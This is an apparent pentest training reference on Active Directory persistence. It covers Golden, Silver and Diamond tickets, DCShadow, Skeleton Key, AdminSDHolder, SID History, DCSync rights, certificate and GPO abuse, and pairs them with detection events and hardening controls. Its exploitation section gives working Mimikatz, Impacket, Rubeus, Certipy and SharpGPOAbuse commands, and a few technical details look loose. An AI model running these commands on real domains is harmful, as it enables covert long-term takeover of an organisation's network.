## 1. Overview

Persistence in Active Directory is the phase where the attacker
establishes long-term access that survives password rotations,
re-ACLs, and partial remediation. Defense (detection + hardening) is
the symmetric phase: how to find and remove persistence, and how to
prevent it.

This file covers the standard AD persistence techniques and the
defensive controls that detect or block them.

**Techniques at a glance:**

| Technique | Requires | Survives | Detection |
|-----------|----------|----------|-----------|
| Golden Ticket | KRBTGT hash | Until KRBTGT rotated twice | 4769 anomalies, TGT lifetime |
| Silver Ticket | Service account hash | Until service password rotated | 4769 without 4768 |
| Diamond Ticket | KRBTGT hash + DA | Until KRBTGT rotated | Harder to detect (valid TGT) |
| Sapphire Ticket | KRBTGT hash + DA | Until KRBTGT rotated | Harder to detect (real TGT) |
| DCShadow | DA + rogue DC | Until DC re-registered | 4742 (DC registered), 5137 |
| Skeleton Key | DA + LSASS patch | Until DC reboot | 4688 (mimikatz), LSASS patch |
| AdminSDHolder | Write on AdminSDHolder | SDProp reapplication (persistent) | 5136 on AdminSDHolder |
| SID History | DA + trust | Until SID removed | 4765 (SID History added) |
| DCSync rights | Write on domain root | Until ACL removed | 4662 (replication GUIDs) |
| Certificate persistence | ADCS ESC + enroll | Until certificate revoked | 4886, 4887 |
| GPO persistence | Write on GPO | Until GPO removed | 5136 on GPO, 4739 |

**Why persistence matters:**

- Real-world intrusions last months; attackers persist silently.
- Most persistence survives password rotations.
- Detection is often retrospective (weeks or months later).
- Remediation requires knowing exactly what was changed.

## 2. Reconnaissance / Enumeration

**Offensive - verify persistence is in place:**

    # Golden Ticket: check if the forged TGT is accepted
    klist
    dir \\dc01.corp.local\c$

    # Silver Ticket: check if the forged TGS is accepted
    # (no prior TGT request - 4768 absent)

    # DCShadow: check for rogue DC registration
    netdom query dc
    Get-ADDomainController -Filter *

    # AdminSDHolder: check who has rights after SDProp
    Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs

    # SID History: check a user's SIDHistory
    Get-DomainUser USER -Properties sidhistory
    wmic useraccount get name,sid

    # DCSync rights: check the domain root ACL
    Get-DomainObjectAcl -Identity "DC=corp,DC=local" -ResolveGUIDs | Where-Object { $_.ObjectAceType -match "Replicating Directory Changes" }

**Defensive - hunt persistence:**

    # Check for DCSync rights on non-admin accounts
    Get-DomainObjectAcl -Identity "DC=corp,DC=local" -ResolveGUIDs | Where-Object { $_.ObjectAceType -match "Replicating Directory Changes" -and $_.SecurityIdentifier -notin @("S-1-5-18","S-1-5-21-...-500") }

    # Check for suspicious SID History
    Get-DomainUser -Properties samaccountname,sidhistory | Where-Object { $_.sidhistory } | Select samaccountname,sidhistory

    # Check for rogue DCs
    Get-ADDomainController -Filter * | Select Name,HostName,Site

    # Check for suspicious AdminSDHolder changes
    Get-DomainObjectAcl -Identity "CN=AdminSDHolder,CN=System,DC=corp,DC=local" -ResolveGUIDs

    # Check for suspicious certificate enrollments
    certutil -view -restrict "Disposition=20" -out "RequestID,RequesterName,NotBefore,NotAfter"

**Defensive - audit logs to check:**

- Event 4769 (TGS request) with `Ticket Encryption Type = 0x17` (RC4).
- Event 4768 (TGT request) with `Pre-Authentication Type = 0` or
  unusually long ticket lifetime.
- Event 4624 (logon) with `Logon Type 3` (network) from a NTLM logon
  process (`NtLmSsp`).
- Event 4662 (directory service access) with replication GUIDs.
- Event 5136 (directory service object modification) on sensitive
  objects.
- Event 4742 (computer account changed) - rogue DC registration.
- Event 4886 / 4887 (certificate services) - unusual enrollments.

## 3. Common Attack Vectors

**Golden Ticket:**

- Forge a TGT with the KRBTGT hash.
- Valid until KRBTGT is rotated twice.
- Grants access to any service in the domain.
- Detection: 4769 anomalies (TGT lifetime, encryption type).

**Silver Ticket:**

- Forge a TGS with a service account hash.
- Valid for the specific service (cifs, http, mssql, etc.).
- No TGT request (4768) precedes the TGS request (4769) - anomalous.
- Grants access to the specific service.

**Diamond Ticket:**

- Modify a legitimate TGT (not forge from scratch).
- The resulting ticket is a valid TGT with a modified PAC.
- Harder to detect than Golden Ticket.

**Sapphire Ticket:**

- Obtain a legitimate TGT for a user, then modify the PAC.
- The TGT is a real TGT, so the KRBTGT check passes.
- Hardest to detect.

**DCShadow:**

- Register a rogue DC (`DsAddSvc`), push changes via replication,
  unregister.
- Changes appear as legitimate replication traffic.
- Detection: 4742 (computer account changed), 5137 (object created).

**Skeleton Key:**

- Patch LSASS on a DC to accept a master password (default
  `mimikatz`).
- Valid until the DC reboots.
- Detection: 4688 (mimikatz), LSASS patch (memory forensics).

**AdminSDHolder:**

- Grant a controlled user rights on AdminSDHolder.
- SDProp reapplies the ACL to all protected objects every 60 minutes.
- Survives re-ACLs and password rotations.
- Detection: 5136 on AdminSDHolder.

**SID History:**

- Inject an Enterprise Admins SID into a user's SIDHistory.
- Requires DA in a domain that trusts the target domain.
- Detection: 4765 (SID History added).

**DCSync rights:**

- Grant a controlled user replication rights on the domain root.
- The user can now DCSync at will.
- Detection: 4662 with replication GUIDs.

**Certificate persistence:**

- Enroll a certificate for a DA user (after ADCS compromise).
- The certificate is valid for the CA's lifetime.
- Detection: 4886, 4887.

**GPO persistence:**

- Modify a GPO to add a logon script, scheduled task, or local admin.
- Applies to all users/computers in the linked OU.
- Detection: 5136 on GPO, 4739.

## 4. Exploitation Recipes

**Golden Ticket with Mimikatz:**

    # On a compromised host (with KRBTGT hash + domain SID)
    mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:<KRBTGT_HASH> /ptt

    # Expected output:
    # User      : Administrator
    # Domain    : corp.local (CORP)
    # SID       : S-1-5-21-...
    # User Id   : 500
    # Groups Id : *513 512 520 518 519
    # ServiceKey: <KRBTGT_HASH> - rc4_hmac_nt
    # Lifetime  : 10/14/2026 12:00:00 ; 10/24/2026 12:00:00
    # -> Ticket : ** Pass The Ticket **

    # Use the ticket
    klist
    dir \\dc01.corp.local\c$
    secretsdump.py -k -no-pass corp.local/Administrator@dc01.corp.local

**Golden Ticket with Impacket (Linux):**

    ticketer.py -nthash <KRBTGT_HASH> -domain-sid S-1-5-21-... -domain corp.local Administrator

    # Use the ticket
    export KRB5CCNAME=Administrator.ccache
    psexec.py -k -no-pass corp.local/Administrator@dc01.corp.local

**Silver Ticket:**

    # Forge a TGS for CIFS on a specific host
    ticketer.py -nthash <SERVICE_ACCOUNT_HASH> -domain-sid S-1-5-21-... -domain corp.local -spn cifs/srv01.corp.local Administrator

    # Use the ticket
    export KRB5CCNAME=Administrator.ccache
    smbclient //srv01.corp.local/c$ -k -no-pass

**Diamond Ticket (Rubeus):**

    # 1. Request a legitimate TGT
    Rubeus.exe asktgt /user:USER /password:PASS /domain:corp.local /dc:dc01.corp.local /nowrap

    # 2. Modify the PAC (add Domain Admins)
    Rubeus.exe diamond /tgt:<base64> /ticketuser:Administrator /ticketuserid:500 /groups:512 /krbkey:<KRBTGT_HASH> /nowrap

    # 3. Use the modified ticket
    Rubeus.exe ptt /ticket:<base64>

**DCShadow (Mimikatz):**

    # Terminal 1: Start the rogue DC
    mimikatz # lsadump::dcshadow /object:CN=USER,CN=Users,DC=corp,DC=local /attribute:primaryGroupID /value:512

    # Terminal 2: Push the changes via replication
    mimikatz # lsadump::dcshadow /push

    # Expected output:
    # [DC] Object registered
    # [DC] Push
    # [DC] Object unregistered

**Skeleton Key:**

    # On a DC (requires DA + SeDebugPrivilege)
    mimikatz # privilege::debug
    mimikatz # misc::skeleton

    # Expected output:
    # [KDC] Skeleton key patched
    # [KDC] Master password: mimikatz

    # Use the master password
    net use \\dc01.corp.local\c$ /user:CORP\Administrator mimikatz

**AdminSDHolder persistence:**

    # Grant yourself GenericAll on AdminSDHolder
    Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=corp,DC=local" -PrincipalIdentity USER -Rights All

    # Wait for SDProp (60 minutes) or trigger it manually
    # Trigger SDProp (requires admin on a DC)
    # On the DC: Invoke-Command -ScriptBlock { Set-ADObject -Identity "CN=AdminSDHolder,CN=System,DC=corp,DC=local" -Replace @{} }

    # After SDProp: USER has GenericAll on all protected objects

**SID History injection:**

    # Requires DA in a domain that trusts the target domain
    # (or a child domain that trusts the forest root)
    mimikatz # sid::patch
    mimikatz # sid::add /sam:USER /new:<ENTERPRISE_ADMINS_SID>
    mimikatz # sid::modify /sam:USER /new:<DOMAIN_SID>

    # The user now has Enterprise Admins in their SIDHistory

**DCSync rights persistence:**

    # Grant DCSync to a controlled user
    Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" -PrincipalIdentity USER -Rights DCSync

    # The user can now DCSync at will
    secretsdump.py corp.local/USER:PASS@10.10.10.10

**Certificate persistence:**

    # After ADCS compromise, enroll a certificate for a DA user
    certipy req -u USER@corp.local -p PASS -ca CORP-CA -template User -upn Administrator@corp.local -dc-ip 10.10.10.10

    # The certificate is valid for the CA's lifetime
    # Authenticate with it whenever needed
    certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10

**GPO persistence:**

    # Write access on a GPO linked to an OU with privileged computers
    # Add an immediate scheduled task to the GPO
    Set-GPPrefRegistryValue -Name "EvilGPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "C:\Windows\Temp\payload.exe" -Type String

    # Or use SharpGPOAbuse
    SharpGPOAbuse.exe --AddComputerTask --TaskName "Updater" --Author CORP\Administrator --Command "cmd.exe" --Arguments "/c C:\Windows\Temp\payload.exe" --GPOName "EvilGPO"

## 5. Post-Exploitation

**After Golden Ticket:**

- The ticket is valid for 10 hours (default); renew with `/renewmax`.
- Rotate KRBTGT twice to invalidate all Golden Tickets.
- The attacker's TGT is undetectable unless event 4769 anomalies are
  monitored.

**After Silver Ticket:**

- Valid for the specific service until the service account password is
  rotated.
- Rotate the service account password to invalidate.

**After Diamond / Sapphire Ticket:**

- Harder to detect; rely on behavioral anomalies (unusual TGT use).
- Rotate KRBTGT twice to invalidate.

**After DCShadow:**

- Rogue DC is unregistered after the push; no persistent object.
- The changes (e.g. primaryGroupID) persist as legitimate replication.
- Detection requires monitoring 4742 and 5137 events.

**After Skeleton Key:**

- Valid until the DC reboots.
- Reboot the DC to invalidate.
- Detection requires LSASS memory forensics.

**After AdminSDHolder:**

- Persistent across password rotations and re-ACLs.
- Remove the ACE from AdminSDHolder and wait for SDProp.
- Verify removal after SDProp (60 minutes).

**After SID History:**

- Persistent until the SIDHistory attribute is cleared.
- Clear with `Set-ADUser -Identity USER -Clear sidHistory` (requires
  DA in both domains).

**After DCSync rights:**

- Persistent until the ACE is removed.
- Remove with `Remove-DomainObjectAcl`.

**After certificate persistence:**

- Valid for the CA's lifetime (1-5 years).
- Revoke the certificate (requires CA admin).
- Rotate the CA if the private key is compromised.

**After GPO persistence:**

- Persistent until the GPO is modified or unlinked.
- Audit GPO changes and re-apply baseline.

## 6. Risk Context

Persistence is what makes AD intrusions last months:

- Golden Tickets survive password rotations and partial remediation.
- AdminSDHolder persistence survives re-ACLs.
- Certificate persistence lasts for years.
- DCSync rights are silent until used.
- DCShadow changes appear as legitimate replication.

**Blast radius:** after persistence is established, the attacker can
return at will - often unnoticed.

**Why persistence succeeds:**

- KRBTGT is rarely rotated (even after compromise).
- AdminSDHolder is rarely audited.
- ADCS certificates are rarely revoked.
- Service account passwords are rarely rotated.
- DCSync rights are rarely audited.
- GPOs accumulate over years; changes are rarely reviewed.

## 7. Root Causes

- **KRBTGT not rotated.** Even after a known compromise, many
  organizations never rotate.
- **AdminSDHolder not audited.** ACL changes are not monitored.
- **ADCS certificates not revoked.** Enrollment is rarely audited.
- **Service account passwords not rotated.** After compromise, the
  hashes remain valid.
- **DCSync rights on non-admin accounts.** Entra Connect, backup tools,
  and monitoring accounts.
- **GPOs not reviewed.** Changes are rarely audited.
- **No baseline of legitimate persistence.** Impossible to detect
  anomalies without a baseline.

## 8. Preventive Controls

**KRBTGT rotation:**

- Rotate KRBTGT twice after any suspected compromise (with a delay of
  at least 10 hours between rotations).
- Rotate annually as a baseline.
- Script it: `Reset-KrbtgtKey` (Microsoft) or a custom script.

**AdminSDHolder:**

- Audit ACL quarterly.
- Remove `GenericAll`, `WriteDacl`, `WriteOwner` from non-admin
  principals.
- Enable alerts on 5136 for AdminSDHolder.

**ADCS:**

- Audit enrollment (4886, 4887).
- Revoke certificates for terminated employees.
- Monitor templates with unusual SANs.
- Restrict enrollment to authorized users.

**Service accounts:**

- Use gMSA where possible.
- Rotate passwords quarterly (25+ chars, random).
- Monitor Kerberoasting attempts (4769 RC4).

**DCSync:**

- Audit replication rights quarterly.
- Document Entra Connect and backup accounts.
- Remove DCSync from any other account.

**GPOs:**

- Audit GPO changes quarterly.
- Restrict write access to GPOs linked to privileged OUs.
- Enable advanced audit on GPO modifications (5136, 4739).

**General:**

- Tiered administration model (Tier 0 / 1 / 2).
- PAWs for Tier 0.
- Protected Users for Tier 0 accounts.
- Credential Guard on Windows 10/11 and Server 2016+.

## 9. Detection Controls

**Golden Ticket:**

- Event 4769 with a TGT lifetime longer than the default (10 hours).
- Event 4769 with an unexpected encryption type.
- Event 4769 for a user with no prior 4768 (TGT request).
- Event 4672 (special privileges) for non-admin users.

**Silver Ticket:**

- Event 4769 without a preceding 4768 (no TGT request).
- Event 4769 with a TGS for a service the user never accessed.
- Event 4769 with an anomalous `Client Address`.

**Diamond / Sapphire Ticket:**

- Behavioral anomalies: TGT use from unexpected IPs, unusual services.
- Rely on UEBA (User and Entity Behavior Analytics).

**DCShadow:**

- Event 4742 (computer account changed) - rogue DC registration.
- Event 5137 (object created) - rogue DC objects.
- Event 4662 with `DsAddSvc` / `DsRemoveSvc` operations.

**Skeleton Key:**

- Event 4688 (mimikatz, powershell with `misc::skeleton`).
- LSASS memory forensics (patched LSASS).
- Event 4624 with `mimikatz` master password.

**AdminSDHolder:**

- Event 5136 (directory service object modification) on
  `CN=AdminSDHolder,CN=System`.
- Event 4780 (ACL set on admin accounts).
- Event 4738 (user account changed) - SDProp reapplication.

**SID History:**

- Event 4765 (SID History added).
- Event 4766 (SID History add failed).
- Event 5136 on `sIDHistory` attribute.

**DCSync rights:**

- Event 4662 with replication GUIDs:
  - `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2`
  - `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2`
- Alert on any account other than the DC machine account and the
  documented Entra Connect account.

**Certificate persistence:**

- Event 4886 (certificate services: certificate issued).
- Event 4887 (certificate services: certificate request approved).
- CA audit log on templates with unusual SANs.

**GPO persistence:**

- Event 5136 (directory service object modification) on GPO objects.
- Event 4739 (domain policy changed).
- Event 4688 on managed hosts - unexpected process from a GPO.

**General:**

- Honeytokens: fake privileged accounts, fake service accounts, fake
  GPOs. Any authentication or modification is high-confidence.

## 10. Verification

**Offensive - is persistence in place?**

- Golden Ticket: forged TGT accepted; access to services that should be
  inaccessible.
- Silver Ticket: forged TGS accepted; access to the target service.
- DCShadow: pushed changes are visible (e.g. primaryGroupID).
- Skeleton Key: master password accepted.
- AdminSDHolder: after SDProp, the granted right is effective on
  protected objects.
- SID History: the user has the injected SID.
- DCSync: `secretsdump` succeeds with the controlled user.
- Certificate: authentication with the .pfx succeeds.
- GPO: the managed host executes the GPO payload.

**Defensive - are controls effective?**

- Test KRBTGT rotation: after two rotations, all Golden Tickets fail.
- Test AdminSDHolder: no unexpected ACEs; alerts fire on modification.
- Test ADCS revocation: revoked certificates fail authentication.
- Test DCSync: only documented accounts have replication rights.
- Test GPO audit: changes are logged and alerted.
- Test SID filtering: SID History injection fails on external trusts.

## 11. OSCP Notes

- Persistence is rarely required in OSCP (the exam is time-boxed), but
  is essential for OSCP Pro Labs and real engagements.
- Golden Ticket and Silver Ticket are the classic persistence
  techniques; practice the full chain (DCSync -> KRBTGT hash ->
  Golden Ticket -> access).
- AdminSDHolder is a stealthy persistence technique; practice with
  PowerView.
- **Capture screenshots** of:
  - The KRBTGT hash from DCSync output.
  - The Golden Ticket forged and used (klist + access).
  - The AdminSDHolder ACE.
  - The persistence verification (access after re-ACL).
- The `> [!IMPORTANT]` OSCP reporting note applies to the persistence
  verification step.

## 12. Production Notes

- KRBTGT rotation is rare in production; assume Golden Tickets remain
  valid indefinitely after a compromise.
- AdminSDHolder persistence is subtle and often missed; audit the object
  quarterly.
- ADCS certificate persistence is the modern stealthy technique;
  monitor 4886/4887.
- DCShadow is extremely stealthy; detection requires DC registration
  monitoring (4742).
- Skeleton Key is loud (LSASS patch); modern EDR flags it immediately.
- Assume the attacker is persistent; remediation requires a full AD
  rebuild in the worst case.
- Incident response for AD compromise: rotate KRBTGT twice, rotate all
  Tier 0 passwords, rebuild compromised hosts, audit ADCS enrollment,
  audit AdminSDHolder, audit DCSync rights, audit GPOs.

## 13. References

**Microsoft documentation:**

- KRBTGT account password reset - https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/ad-forest-recovery-reset-the-krbtgt-password
- AdminSDHolder, Protected Admin Groups - https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory
- Active Directory Certificate Services - https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/active-directory-certificate-services-overview

**MITRE ATT&CK:**

- Persistence - Account Manipulation (T1098) - https://attack.mitre.org/techniques/T1098/
- Persistence - Create Account (T1136) - https://attack.mitre.org/techniques/T1136/
- Persistence - Domain Policy Modification (T1484) - https://attack.mitre.org/techniques/T1484/
- Credential Access - Steal or Forge Kerberos Tickets (T1558) - https://attack.mitre.org/techniques/T1558/
- Defense Evasion - Rogue Domain Controller (T1207) - https://attack.mitre.org/techniques/T1207/

**Tools:**

- Mimikatz - https://github.com/gentilkiwi/mimikatz - Golden/Silver Ticket, DCShadow, Skeleton Key, SID History
- Rubeus - https://github.com/GhostPack/Rubeus - Diamond Ticket, Sapphire Ticket
- Impacket - https://github.com/fortra/impacket - ticketer, secretsdump, getST
- Certipy - https://github.com/ly4k/Certipy - ADCS persistence
- SharpGPOAbuse - https://github.com/FSecureLABS/SharpGPOAbuse - GPO persistence
- BloodHound - https://github.com/BloodHoundAD/BloodHound - attack-path analysis

**Research:**

- ADSecurity.org - Golden Ticket - https://adsecurity.org/?p=1640
- ADSecurity.org - DCShadow - https://adsecurity.org/?p=1729
- SpecterOps - Diamond and Sapphire Tickets - https://posts.specterops.io/
- The Hacker Recipes - Persistence - https://www.thehacker.recipes/ad/persistence
